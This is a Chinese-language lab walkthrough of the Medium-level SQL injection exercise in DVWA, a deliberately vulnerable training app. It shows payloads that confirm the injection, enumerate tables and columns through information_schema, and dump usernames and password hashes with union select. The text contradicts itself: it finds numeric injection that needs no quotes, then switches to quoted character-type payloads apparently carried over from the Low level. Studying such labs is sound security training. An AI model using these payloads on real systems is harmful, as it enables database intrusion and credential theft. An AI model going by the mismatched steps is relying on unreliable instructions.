# **0x01. SQL Injection(Medium)**  

相关代码分析

![](../Images/4f6a72e00551b602eb53713f9d79df01.png)

Medium级别的代码利用mysql\_real\_escape\_string函数对特殊符号

\\x00,\\n,\\r,\\,',",\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

判断是否存在注入，注入是字符型还是数字型

抓包更改参数id为1' or 1=1 #

![](../Images/497bf5b80430c842db9e6ef8427e97e0.png)

报错：

![](../Images/78bf99cfd97df6276c0939a002fd2996.png)

抓包更改参数id为1 or 1=1 #

![](../Images/0b33d3c21636f351bf2060ac06b9322b.png)

查询成功：

![](../Images/d9dd4b346e9c239c0885b848d6c6bb57.png)

说明存在数字型注入。

（由于是数字型注入，服务器端的mysql\_real\_escape\_string函数就形同虚设了，因为数字型注入并不需要借助引号。）

中间的操作和低等级的SQL注入类似，只是抓包修改

输入1，正常返回

![](../Images/fbe166cb8a54e1883b634b9caaaa1047.png)

输入1'，产生报错，存在字符型SQL注入

![](../Images/9a8fb4de43bee53c4c3ce2c2c1af84c0.png)

判断字段数，输入1' order by 2 -- q，回显正常，用-- q注释掉前面的单引号

![](../Images/6bcfce57e24699fe0bfd424cc14dd1ce.png)

输入1' order by 3 -- q，回显错误，所以字段数为2

![](../Images/09b68759918b13124a56e6c11a77d958.png)

判断回显点，输入1' union select 1,2 -- q，可以在如图所示的位置获取我们想要的内容

![](../Images/a65724ae73b1eb058eee628d49da990c.png)

查询当前数据库名为dvwa，输入1' union select 1,database() -- q

![](../Images/cf4193de40fb8fb1f03e25f42d6d9341.png)

查询当前数据库下的所有表名guestbook,users，输入1' union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database() -- q

![](../Images/5f6ff3bbe6821cfda6f02364f177a7e1.png)

查询users表中的所有字段user\_id,first\_name,last\_name,user,password,avatar,last\_login,failed\_login，输入1' union select 1,group\_concat(column\_name) from information\_schema.columns where table\_schema=database() and table\_name='users' -- q

![](../Images/dbf8620895cf1cd40a0dd9a344171b7a.png)

查询user和password字段的内容，输入1' union select group\_concat(user),group\_concat(password) from users -- q

![](../Images/56da7da47554cfe7a15c9aa847a8a8fa.png)
